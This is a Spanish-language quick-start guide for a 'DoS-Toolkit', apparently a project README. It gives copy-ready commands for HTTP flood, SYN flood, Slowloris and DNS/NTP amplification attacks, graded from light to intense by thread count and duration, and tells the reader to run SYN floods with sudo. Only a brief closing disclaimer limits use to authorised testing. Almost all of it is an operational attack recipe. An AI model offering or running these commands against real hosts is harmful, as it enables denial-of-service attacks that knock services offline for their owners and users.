# Inicio Rápido - DoS-Toolkit

Guía rápida para empezar en 5 minutos.

## 1️⃣ Instalación (2 minutos)

### Windows
```bash
# Descargar Python desde https://www.python.org/downloads/
# Instalar con "Add Python to PATH" marcado

# Instalar dependencias
pip install -r python/requirements.txt
```

### Linux/macOS
```bash
# Instalar Python (si no lo tienes)
sudo apt install python3 python3-pip  # Ubuntu/Debian
brew install python3                   # macOS

# Instalar dependencias
pip install -r python/requirements.txt
```

## 2️⃣ Verificación (1 minuto)

```bash
# Ejecutar pruebas
python test_toolkit.py

# Debería mostrar: "✓ ¡Todas las pruebas pasaron!"
```

## 3️⃣ Primer Ataque (2 minutos)

### Opción A: Usar CLI Interactivo

```bash
# Ejecutar CLI
python cli.py

# Seleccionar:
# 1. Python
# 2. HTTP-Flood
# Ingresar parámetros
```

### Opción B: Línea de Comandos

```bash
# HTTP-Flood contra servidor local
python python/attacks.py --attack http_flood --target localhost --port 8000 --threads 5 --duration 10
```

### Opción C: Crear Servidor de Prueba

```bash
# Terminal 1: Crear servidor
python -m http.server 8000

# Terminal 2: Ejecutar ataque
python python/attacks.py --attack http_flood --target localhost --port 8000 --threads 10 --duration 30
```

---

## 📊 Tipos de Ataques

### HTTP-Flood
```bash
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60
```
**Uso**: Abrumar servidor web con solicitudes HTTP

### SYN-Flood
```bash
sudo python python/attacks.py --attack syn_flood --target 192.168.1.1 --port 443 --threads 100 --duration 60
```
**Uso**: Abrumar tabla de conexiones TCP (requiere admin)

### Slowloris
```bash
python python/attacks.py --attack slowloris --target 192.168.1.1 --port 80 --threads 30 --duration 300
```
**Uso**: Mantener conexiones abiertas indefinidamente

### UDP-Amplification
```bash
python python/attacks.py --attack udp_amplification --target 192.168.1.1 --port 53 --threads 200 --duration 60
```
**Uso**: Amplificar tráfico usando servidores DNS/NTP

---

## 🔧 Parámetros Comunes

```
--attack      http_flood | syn_flood | slowloris | udp_amplification
--target      IP o dominio objetivo
--port        Puerto (default 80)
--threads     Número de threads (default 100)
--duration    Duración en segundos (default 60)
```

---

## 💡 Ejemplos Prácticos

### Prueba Local
```bash
# Terminal 1
python -m http.server 8000

# Terminal 2
python python/attacks.py --attack http_flood --target localhost --port 8000 --threads 5 --duration 10
```

### Ataque Leve
```bash
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 10 --duration 30
```

### Ataque Moderado
```bash
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 100 --duration 120
```

### Ataque Intenso
```bash
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 500 --duration 300
```

---

## 🐛 Solución Rápida de Problemas

### "python: command not found"
```bash
# Usar python3
python3 cli.py
```

### "ModuleNotFoundError: No module named 'requests'"
```bash
# Instalar dependencias
pip install -r python/requirements.txt
```

### "Permission denied" (Linux/macOS)
```bash
# Dar permisos
chmod +x cli.py
python cli.py
```

### "SYN-Flood requiere permisos de administrador"
```bash
# Ejecutar con sudo
sudo python python/attacks.py --attack syn_flood ...
```

---

## 📚 Documentación Completa

- **[README.md](README.md)** - Documentación principal
- **[EJEMPLOS.md](EJEMPLOS.md)** - Ejemplos detallados
- **[SETUP.md](SETUP.md)** - Guía de instalación completa
- **[config.py](config.py)** - Configuración global

---

## ⚠️ Importante

✅ **Permitido:**
- Pruebas en tu propia red
- Laboratorios de seguridad
- Investigación académica
- Pruebas autorizadas

❌ **Prohibido:**
- Ataques no autorizados
- Daño a sistemas ajenos
- Uso malicioso

---

## 🚀 ¡Listo!

Ya puedes ejecutar:
```bash
python cli.py
```

¡Disfruta del DoS-Toolkit!
